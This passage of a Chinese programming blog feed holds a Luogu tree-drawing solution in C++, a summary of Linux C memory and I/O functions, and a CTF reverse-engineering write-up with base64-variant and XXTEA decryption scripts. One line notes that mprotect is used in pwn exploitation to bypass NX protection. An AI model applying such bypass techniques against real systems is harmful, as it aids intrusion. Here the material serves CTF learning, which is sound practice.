class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cin&gt;&gt;n&gt;&gt;k;</span><br><span class="line">num=<span class="number">1</span>&lt;&lt;(n<span class="number">-1</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">long</span> <span class="type">long</span> i=<span class="number">1</span>,j=<span class="number">1</span>;i&lt;=num/<span class="number">2</span>;++i,j+=<span class="number">6</span>)</span><br><span class="line">&#123;</span><br><span class="line">paint[<span class="number">19000</span>][j]=<span class="string">&#x27;o&#x27;</span>;</span><br><span class="line">paint[<span class="number">19000</span>][j+<span class="number">4</span>]=<span class="string">&#x27;o&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>两个一组,很容易得出最下面一行共需要(2^(n-1))&#x2F;2次循环,每次直接两个都放进去’o’,然后很容易的j每次加6(横坐标)</p><p>然后从倒数第二行开始模拟往画布里填’o’或’&#x2F;‘或’\‘<br>我们可以这样:计算出当前行的最左&#x2F;最右结点在画布里的坐标为循环边界,从左边(当前行的所有结点视为向上一行的结点的孩子),即左孩子开始,向右上方朝父节点画’&#x2F;‘.</p><p>但是要画几次呢?这时我们的f[]数组就派上用场了…从第i层向上画’&#x2F;‘当然画f[i]次了,然后画完边后再向右上一格把父节点也就是’o’画上,然后从父结点再往右下画回到右孩子,然后这一个子树画完再画旁边的树,画个流程图吧:<img src="https://cdn.luogu.com.cn/upload/image_hosting/ghvps2ft.png"></p><p>就是这样,先上去,再下来,然后虚线跳到下一个子树,注意这时跳跃的长度每层是不一样的,我们用s[]来存,很容易得出(跟f[]很类似):</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s[<span class="number">20</span>]=&#123;<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">12</span>,<span class="number">24</span>,<span class="number">48</span>,<span class="number">96</span>,<span class="number">192</span>,<span class="number">384</span>,<span class="number">768</span>,<span class="number">1536</span>&#125;;</span><br></pre></td></tr></table></figure><p>每次横坐标加就行了</p><p>这样,我们最后就有了一个完全二叉树,然后就是去节点了.<br>画布里存得是点或边在这张”画”里得坐标,而题目输入进来得是结点在树中得坐标,这时我们就开一个结构体数组存树,数组的每个元素为结点,每个元素(都是一个结构体变量)里的结构体成员x和y存的是通过计算求得的在画布里的坐标,然后找到要删除的点,把它和它的子树所在的一个正方形区都归为’ ‘(空格),如图:<img src="https://cdn.luogu.com.cn/upload/image_hosting/n0l0wfis.png"></p><p>然后,愉快的输出就行了,其他的细节在代码中:</p><p>AC代码:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> n,k,num,x,y,line=<span class="number">19000</span>;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> l,r,f[<span class="number">20</span>]=&#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">11</span>,<span class="number">23</span>,<span class="number">47</span>,<span class="number">95</span>,<span class="number">191</span>,<span class="number">383</span>,<span class="number">767</span>&#125;;<span class="comment">//解释过了</span></span><br><span class="line"><span class="type">long</span> <span class="type">long</span> s[<span class="number">20</span>]=&#123;<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">12</span>,<span class="number">24</span>,<span class="number">48</span>,<span class="number">96</span>,<span class="number">192</span>,<span class="number">384</span>,<span class="number">768</span>,<span class="number">1536</span>&#125;;<span class="comment">//跳跃的长度</span></span><br><span class="line"><span class="type">char</span> paint[<span class="number">20001</span>][<span class="number">5000</span>];<span class="comment">//画布</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">TREE</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> x,y;</span><br><span class="line">&#125;tree[<span class="number">1040</span>];</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">draw</span><span class="params">(<span class="type">long</span> <span class="type">long</span> i)</span><span class="comment">//画边和点</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">x=line,y=l;</span><br><span class="line">l=y+f[i]+<span class="number">1</span>;<span class="comment">//l---左边界的重新计算要在这里</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">long</span> <span class="type">long</span> j=<span class="number">1</span>;j&lt;=num/<span class="number">2</span>;++j)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">/////////向右上画//////////////</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">long</span> <span class="type">long</span> k=<span class="number">1</span>;k&lt;=f[i];++k)</span><br><span class="line">paint[--x][++y]=<span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">paint[--x][++y]=<span class="string">&#x27;o&#x27;</span>;</span><br><span class="line"><span class="comment">//////////////////////////////</span></span><br><span class="line"><span class="comment">/////////向左下画回去//////////</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">long</span> <span class="type">long</span> k=<span class="number">1</span>;k&lt;=f[i];++k)</span><br><span class="line">paint[++x][++y]=<span class="string">&#x27;\\&#x27;</span>;</span><br><span class="line"><span class="comment">//////////////////////////////</span></span><br><span class="line">++x;</span><br><span class="line">y++;</span><br><span class="line">y+=s[i];</span><br><span class="line"><span class="comment">//重新计算坐标</span></span><br><span class="line">&#125;</span><br><span class="line">y-=s[i];</span><br><span class="line">r=y-f[i]<span class="number">-1</span>;</span><br><span class="line">line=x-f[i]<span class="number">-1</span>;</span><br><span class="line">num/=<span class="number">2</span>;</span><br><span class="line"><span class="comment">//把num---即当前行的结点数、</span></span><br><span class="line"><span class="comment">//r---右边界、</span></span><br><span class="line"><span class="comment">//line---最高点的所在行</span></span><br><span class="line"><span class="comment">//重新计算为向上一行(左边界在上边重新计算)</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">remove_down_all</span><span class="params">(<span class="type">long</span> <span class="type">long</span> up,<span class="type">long</span> <span class="type">long</span> r_l,<span class="type">long</span> <span class="type">long</span> r_r)</span><span class="comment">//重置矩形区域</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">long</span> <span class="type">long</span> i=up;i&lt;=<span class="number">19000</span>;++i)</span><br><span class="line"><span class="keyword">for</span>(<span class="type">long</span> <span class="type">long</span> j=r_l;j&lt;=r_r;++j)</span><br><span class="line">paint[i][j]=<span class="string">&#x27; &#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">remove_up_edge</span><span class="params">(<span class="type">long</span> <span class="type">long</span> x,<span class="type">long</span> <span class="type">long</span> y)</span><span class="comment">//删除(重置为&#x27; &#x27;(即空格))要删除点向上与父亲的连线</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> ex=x<span class="number">-1</span>,ey=y<span class="number">-1</span>;</span><br><span class="line"><span class="keyword">if</span>(paint[ex][ey]!=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"><span class="keyword">while</span>(paint[ex][ey]!=<span class="string">&#x27;o&#x27;</span>)</span><br><span class="line">paint[ex--][ey--]=<span class="string">&#x27; &#x27;</span>;</span><br><span class="line">ex=x<span class="number">-1</span>,ey=y+<span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span>(paint[ex][ey]!=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"><span class="keyword">while</span>(paint[ex][ey]!=<span class="string">&#x27;o&#x27;</span>)</span><br><span class="line">paint[ex--][ey++]=<span class="string">&#x27; &#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">cin&gt;&gt;n&gt;&gt;k;</span><br><span class="line"><span class="keyword">if</span>(n==<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">cout&lt;&lt;endl;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">memset</span>(paint,<span class="string">&#x27; &#x27;</span>,<span class="built_in">sizeof</span>(paint));</span><br><span class="line">num=<span class="number">1</span>&lt;&lt;(n<span class="number">-1</span>);</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> num2=num;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> len=<span class="number">0</span>;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> to=(num2/<span class="number">2</span>)*<span class="number">6</span><span class="number">-1</span>;<span class="comment">//to为整棵树的宽度,我们要用它输出树(列循环范围)</span></span><br><span class="line">l=<span class="number">1</span>;r=(num/<span class="number">2</span>)*<span class="number">6</span><span class="number">-1</span>;<span class="comment">//初始化左右边界</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">long</span> <span class="type">long</span> i=<span class="number">1</span>,j=<span class="number">1</span>;i&lt;=num/<span class="number">2</span>;++i,j+=<span class="number">6</span>)<span class="comment">//初始化最下面一行</span></span><br><span class="line">&#123;</span><br><span class="line">paint[<span class="number">19000</span>][j]=<span class="string">&#x27;o&#x27;</span>;</span><br><span class="line">paint[<span class="number">19000</span>][j+<span class="number">4</span>]=<span class="string">&#x27;o&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">long</span> <span class="type">long</span> i=<span class="number">1</span>;i&lt;n;++i)<span class="comment">//开始从下往上每一层&quot;绘画&quot;</span></span><br><span class="line"><span class="built_in">draw</span>(i);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">long</span> <span class="type">long</span> i=line;i&lt;=<span class="number">19000</span>;++i)<span class="comment">//计算坐标,用以删除结点</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">long</span> <span class="type">long</span> j=<span class="number">1</span>;j&lt;=to;++j)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(paint[i][j]==<span class="string">&#x27;o&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">tree[++len].x=i;</span><br><span class="line">tree[len].y=j;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> t,y1,y2;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">long</span> <span class="type">long</span> i=<span class="number">1</span>;i&lt;=k;++i)<span class="comment">//删除结点(每次删除之前的准备工作)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;x,&amp;y);</span><br><span class="line">t=<span class="number">1</span>&lt;&lt;(x<span class="number">-1</span>);</span><br><span class="line">t=t+y<span class="number">-1</span>;</span><br><span class="line"><span class="keyword">if</span>(t&gt;len)<span class="keyword">continue</span>;</span><br><span class="line">x=tree[t].x;</span><br><span class="line">y=tree[t].y;</span><br><span class="line">y1=y-(<span class="number">19000</span>-x);</span><br><span class="line">y2=y+(<span class="number">19000</span>-x);</span><br><span class="line"></span><br><span class="line"><span class="built_in">remove_down_all</span>(x,y1,y2);</span><br><span class="line"><span class="built_in">remove_up_edge</span>(x,y);<span class="comment">//这两个函数才是真正的删除</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//处理完了......</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">long</span> <span class="type">long</span> i=line;i&lt;=<span class="number">19000</span>;++i)<span class="comment">//输出,结束</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">long</span> <span class="type">long</span> j=<span class="number">1</span>;j&lt;=to;++j)</span><br><span class="line">cout&lt;&lt;paint[i][j];</span><br><span class="line">cout&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>管理员求过…真的是自己的做法</p>]]></content>
      
      
      <categories>
          
          <category> 洛谷 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>c系函数总结</title>
      <link href="/2023/08/28/%E4%BA%8C%E8%BF%9B%E5%88%B6/%E5%87%BD%E6%95%B0%E6%80%BB%E7%BB%93/"/>
      <url>/2023/08/28/%E4%BA%8C%E8%BF%9B%E5%88%B6/%E5%87%BD%E6%95%B0%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="Linux-c函数"><a href="#Linux-c函数" class="headerlink" title="Linux c函数"></a>Linux c函数</h1><h2 id="内存控制"><a href="#内存控制" class="headerlink" title="内存控制"></a>内存控制</h2><h3 id="mprotect函数"><a href="#mprotect函数" class="headerlink" title="mprotect函数"></a>mprotect函数</h3><p>用于更改一段内存的保护属性,例如将可读写的内存区域变为只读，或者将只读的内存区域变为可执行等.</p><p>pwn中常用于修改.bss段的属性以此来绕过<strong>NX保护</strong>.</p><p>函数原型:</p><p><code>int mprotect(void *addr, size_t len, int prot);</code></p><p>参数说明：</p><ul><li><code>addr</code>：要更改保护属性的内存区域的起始地址。</li><li><code>len</code>：内存区域的长度（以字节为单位）。</li><li><code>prot</code>：新的保护权限，可以是 <code>PROT_NONE</code>、<code>PROT_READ</code>、<code>PROT_WRITE</code>、<code>PROT_EXEC</code> 等的组合。</li></ul><p><code>mprotect</code> 函数返回 0 表示成功，返回 -1 表示失败，并设置相应的错误码。</p><h3 id="mmap函数"><a href="#mmap函数" class="headerlink" title="mmap函数"></a>mmap函数</h3><p>用于内存映射,可以用于简化例如进程间通信—IPC需要4次数据复制,而内存映射到共享区只需2次复制即可</p><p>函数原型:</p><p><code>void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset);</code></p><p>参数说明：</p><ul><li><code>addr</code>：映射的起始地址，通常为 <code>NULL</code>，由系统自动分配。</li><li><code>length</code>：映射区域的大小，以字节为单位。</li><li><code>prot</code>：映射区域的保护权限，可以是 <code>PROT_READ</code>、<code>PROT_WRITE</code>、<code>PROT_EXEC</code> 等的组合。</li><li><code>flags</code>：映射选项，如 <code>MAP_SHARED</code>、<code>MAP_PRIVATE</code> 等。</li><li><code>fd</code>：文件描述符，表示要映射的文件或设备。</li><li><code>offset</code>：映射的偏移量，表示从文件的哪个位置开始映射。</li></ul><p><code>mmap</code> 返回一个指向映射区域的指针，如果映射失败，则返回 <code>MAP_FAILED</code>。</p><h3 id="read函数"><a href="#read函数" class="headerlink" title="read函数"></a>read函数</h3><p>用于读取文件—linux一切皆文件,从打开的文件描述符中读取</p><p>函数原型:</p><p><code>ssize_t read(int fd, void *buf, size_t count);</code></p><p>参数为:</p><p>​文件描述符,读入到的缓冲区,读取的字节数</p><h3 id="write函数"><a href="#write函数" class="headerlink" title="write函数"></a>write函数</h3><p>用于读取文件—linux一切皆文件,从打开的文件描述符中写入</p><p>函数原型:</p><p><code>ssize_t write(int fd, const void *buf, size_t count);</code></p><p>参数为:</p><p>​文件描述符,制定从哪个缓冲区用于写入,写入的字节数</p>]]></content>
      
      
      <categories>
          
          <category> 知识库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> functions </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>二进制作业第三周</title>
      <link href="/2023/08/06/%E4%BA%8C%E8%BF%9B%E5%88%B6/WriteUp(%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%BD%9C%E4%B8%9A%E7%AC%AC%E4%B8%89%E5%91%A8)/"/>
      <url>/2023/08/06/%E4%BA%8C%E8%BF%9B%E5%88%B6/WriteUp(%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%BD%9C%E4%B8%9A%E7%AC%AC%E4%B8%89%E5%91%A8)/</url>
      
        <content type="html"><![CDATA[<h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="拔丝溜四（NewstarsCTF2022）"><a href="#拔丝溜四（NewstarsCTF2022）" class="headerlink" title="拔丝溜四（NewstarsCTF2022）"></a>拔丝溜四（NewstarsCTF2022）</h2><p><del>题在这里:</del><a href="https://buuoj.cn/match/matches/146/challenges#%E6%8B%94%E4%B8%9D%E6%BA%9C%E8%82%86%20(easy)">https://buuoj.cn/match/matches/146/challenges#%E6%8B%94%E4%B8%9D%E6%BA%9C%E8%82%86%20(easy)</a></p><p>这个题,对base64进行了魔改…</p><p>首先,分析题目,从start入口寻找main:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230806194752784.png" alt="image-20230806194752784"></p><p>从这里的Code&#x3D;某个函数()继续进入(既然是给返回代码赋值,那么很有可能就是main入口)</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230806194844163.png" alt="image-20230806194844163"></p><p>这里的j_main是我命名成main的,后来IDA又重新分析为j_main(),进入真正的main后就可以正式分析了,</p><p>实际上代码就是对输入的长度为42的flag进行魔改的base64编码,编码结果就是main中那个显而易见的str2:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230806195020106.png" alt="image-20230806195020106"></p><p>第29行的encode()也是自己修改的函数名,魔改的base64()编码就是这里进行</p><p>进入后发现不是普通的base64,encode()将flag分成若干组,3个一组分别进行编码,但是每一组都使用不同的编码字符表—也就是所谓的变表加密</p><p>再次进入循环中的第一句函数调用中,发现有一个rand(),实际从逻辑上考虑肯定不可能是随机的,否则不会出现那个固定的base64结果,所以联想到对srand()调用时输入了某个固定的种子,但是我这里没有看出来哪个是srand()函数的调用(我太菜了)</p><p>于是我使用动态调试的方法,一个个的把求字符表的偏移值v1求出来:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230806195428984.png" alt="image-20230806195428984" style="zoom:50%;" /><p>在这里设断点后,直到运行完,把所有的v1出现过的值写成python列表就可以写解密脚本了:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">data = <span class="string">&#x27;CPaKBfUZFcNwW9qCKgyvuS2PGPQ9mttGc/wCNS0w6hDwGOSsOkOEkL5V&#x27;</span></span><br><span class="line">alpha = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line">key = [<span class="number">0x29</span>, <span class="number">0x28</span>, <span class="number">0x39</span>, <span class="number">0xa</span>, <span class="number">0x3e</span>, <span class="number">0x1e</span>, <span class="number">0x3b</span>, <span class="number">0x19</span>, <span class="number">0x0c</span>, <span class="number">0x0</span>, <span class="number">0x2e</span>, <span class="number">0x3a</span>, <span class="number">0x1</span>, <span class="number">0x18</span>]</span><br><span class="line"><span class="comment">#key即v1的所有变化值</span></span><br><span class="line">step = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(data), <span class="number">4</span>):</span><br><span class="line">    new_alpha = <span class="string">&#x27;&#x27;</span> + alpha[key[step]:] + alpha[<span class="number">0</span>:key[step]]<span class="comment">#将原字符表进行两部分的切片,调换位置,如不懂需要再去看看源码逻辑</span></span><br><span class="line">    <span class="comment"># print(new_alpha)</span></span><br><span class="line">    step += <span class="number">1</span></span><br><span class="line">    result = base64.b64decode(data[i:i + <span class="number">4</span>].translate(<span class="built_in">str</span>.maketrans(new_alpha, alpha)))</span><br><span class="line">    <span class="comment">#这里使用maketrans进行字符表的映射转换</span></span><br><span class="line">    <span class="built_in">print</span>(result.decode(),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行结果:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230806195649900.png" alt="image-20230806195649900"></p><p>但是比赛结束了没办法提交flag…</p><p>结束…</p><h2 id="EzTea-NewstarsCTF2022"><a href="#EzTea-NewstarsCTF2022" class="headerlink" title="EzTea(NewstarsCTF2022)"></a>EzTea(NewstarsCTF2022)</h2><p>这个题顾名思义,Tea加密…</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230807114651660.png" alt="image-20230807114651660" style="zoom:50%;" /><p>去分析代码就能知道,要对输入的串(之所以不说字符串是因为加密解密还是说字节串比较好)进行加密,然后与一个9*sizeof(int32_t)&#x3D;&#x3D;36字节长度的加密后的串进行比较,也就是说这个加密的串就是加密后的flag.</p><p>那么我们要分析程序的加密算法,容易得知这是TEA系列的加密算法,而且通过加密中的&lt;&lt;4和&gt;&gt;4可以知道是TEA目前优化最好的(貌似?)XXTEA加密(不过MX还是要自己改的)</p><p>写出逆向解密脚本:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 这是网上的XXTEA使用的MX,但是与题不符</span></span><br><span class="line"><span class="comment"> * #define MX (z&gt;&gt;5^y&lt;&lt;2) + (y&gt;&gt;3^z&lt;&lt;4)^(sum^y) + (k[p&amp;3^e]^z);</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * IDA反汇编的加密部分,根据此进行MX的修改</span></span><br><span class="line"><span class="comment"> * v9 = ((v5 ^ *(_DWORD * )(a3 + 4i64 * (v10 ^ i &amp; 3))) + (v6 ^ v7)) ^ (((32 * v5) ^ (v6 &gt;&gt; 3))</span></span><br><span class="line"><span class="comment"> * + ((4 * v6) ^ (v5 &gt;&gt; 4)))</span></span><br><span class="line"><span class="comment"> * + intlist[i];</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//这是根据IDA正确编写的解密算法</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MX (((z ^ k[(e^p)&amp;3])+(y^sum))^ (((32*z)^y&gt;&gt;3)+((4*y)^(z&gt;&gt;4))))</span></span><br><span class="line"></span><br><span class="line"><span class="type">long</span> <span class="title function_">btea</span><span class="params">(<span class="type">uint32_t</span> *v, <span class="type">int</span> n, <span class="type">uint32_t</span> *k)</span> &#123;</span><br><span class="line">    <span class="type">uint32_t</span> z = v[n - <span class="number">1</span>], y = v[<span class="number">0</span>], sum = <span class="number">0</span>, e, DELTA = <span class="number">0x11451400</span>;</span><br><span class="line">    <span class="type">unsigned</span> p, q;</span><br><span class="line">    <span class="keyword">if</span> (n &gt; <span class="number">1</span>) &#123;          <span class="comment">/* Coding Part */</span></span><br><span class="line">        q = <span class="number">6</span> + <span class="number">52</span> / n;</span><br><span class="line">        <span class="keyword">while</span> (q-- &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            sum += DELTA;</span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p = <span class="number">0</span>; p &lt; n - <span class="number">1</span>; p++) y = v[p + <span class="number">1</span>], z = v[p] += MX;</span><br><span class="line">            y = v[<span class="number">0</span>];</span><br><span class="line">            z = v[n - <span class="number">1</span>] += MX;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (n &lt; <span class="number">-1</span>) &#123;  <span class="comment">/* Decoding Part */</span></span><br><span class="line">        n = -n;</span><br><span class="line">        q = <span class="number">6</span> + <span class="number">52</span> / n;</span><br><span class="line">        sum = q * DELTA;</span><br><span class="line">        <span class="keyword">while</span> (sum != <span class="number">0</span>) &#123;</span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p = n - <span class="number">1</span>; p &gt; <span class="number">0</span>; p--) z = v[p - <span class="number">1</span>], y = v[p] -= MX;</span><br><span class="line">            z = v[n - <span class="number">1</span>];</span><br><span class="line">            y = v[<span class="number">0</span>] -= MX;</span><br><span class="line">            sum -= DELTA;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">uint32_t</span> k[<span class="number">4</span>] = &#123;<span class="number">0x19</span>, <span class="number">0x19</span>, <span class="number">0x8</span>, <span class="number">0x10</span>&#125;;</span><br><span class="line">    <span class="type">uint8_t</span> data[] = &#123;</span><br><span class="line">            <span class="number">0x82</span>, <span class="number">0x8a</span>, <span class="number">0xfa</span>, <span class="number">0x38</span>, <span class="number">0x80</span>,</span><br><span class="line">            <span class="number">0x13</span>, <span class="number">0x50</span>, <span class="number">0xd7</span>, <span 